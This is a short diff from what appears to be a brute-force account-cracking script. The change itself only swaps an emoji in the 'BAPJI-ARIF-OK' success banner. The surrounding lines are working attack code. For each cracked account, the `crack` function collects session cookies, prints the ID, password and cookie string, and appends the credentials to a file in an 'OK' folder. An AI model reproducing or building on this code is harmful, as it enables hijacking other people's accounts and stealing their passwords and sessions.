@@ -696,7 +696,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				cetak(nel('[green]      ❤️✨ BAPJI-ARIF-OK ❤️✨[green]')) 
+				cetak(nel('[green]      🔥✨ BAPJI-ARIF-OK 🔥✨[green]')) 
 				print(f'\r{H}>> {idf}|{pw}|{kuki}\n{ua}{N}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
